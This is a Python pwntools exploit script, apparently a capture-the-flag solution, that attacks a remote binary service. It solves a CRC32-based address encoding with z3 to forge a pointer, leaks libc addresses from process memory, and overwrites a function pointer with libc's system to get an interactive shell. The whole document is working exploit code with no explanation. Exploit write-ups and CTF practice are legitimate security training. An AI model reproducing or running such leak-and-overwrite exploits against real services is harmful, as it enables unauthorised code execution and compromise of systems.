#!/usr/bin/env python2
from pwn import *
from z3 import *
# p = process("./app")
p = remote("58.229.185.61", 10002)

e = ELF("./app", checksec=False)
libc = e.libc
context.terminal = ["tmux", "split", "-h"]
origin_a = BitVec("FLAG{}".format(1), 64)
fake_a = BitVec("FLAG{}".format(2), 64)
s = Solver()

def enc_addr(addr):
    v6 = 0xffffffff
    for i in range(8):
        base = addr & 0xff
        addr = LShR(addr, 8)
        v6 ^= base
        for j in range(8):
            v6 = If(v6 & 1 != 0, 0xEDB88320 ^ LShR(v6, 1), LShR(v6, 1))

    return ~v6 & 0xffffffff

enc_addrs = [int(p.recvline().strip().split(": ")[1], 16) >> 12 for _ in range(6)]
# s.add(origin_a & 0xfff == 0)
# s.add(origin_a & (0xffffA00000000000) == 0)
# s.add(origin_a & (0x0000500000000000) == 0x0000500000000000)
# s.add(enc_addr(origin_a) == enc_addrs[0])

s.add(fake_a & 0xff != 0)
s.add(fake_a & 0xff00 != 0)
s.add(fake_a & 0xff0000 != 0)
s.add(fake_a & 0xff000000 != 0)
s.add(fake_a & 0xff00000000 != 0)
s.add(fake_a & 0xff0000000000 != 0)
s.add(fake_a & 0xff000000000000 != 0)
s.add(fake_a & 0xff00000000000000 != 0)
s.add(enc_addr(fake_a) == enc_addrs[0])

print s.check()
m = s.model()
# print hex(m[origin_a].as_long())
print hex(m[fake_a].as_long())
fake_addr = m[fake_a].as_long()

# gdb.attach(p, "pb 0x0000000000001907")
p.sendlineafter("> ", "2")
p.sendlineafter("> ", p64(fake_addr))
p.sendlineafter("> ", str(0x1000))

p.sendlineafter("> ", "3")
p.sendlineafter("> ", "0")
dump = (p.recvn(0x1000))

fscanf = u64(dump[0x18:0x20])
libc_base = fscanf - 0x62200
print "libc", hex(libc_base)

new_dump = dump[:0x80] + p64(libc_base + libc.symbols['system']) + dump[0x88:]

p.sendlineafter("> ", "4")
p.sendlineafter("> ", "0")
gdb.attach(p, "pb 0x0000000000001A41")
sleep(0.3)
p.send(new_dump)

p.sendlineafter("> ", "1")

p.interactive()
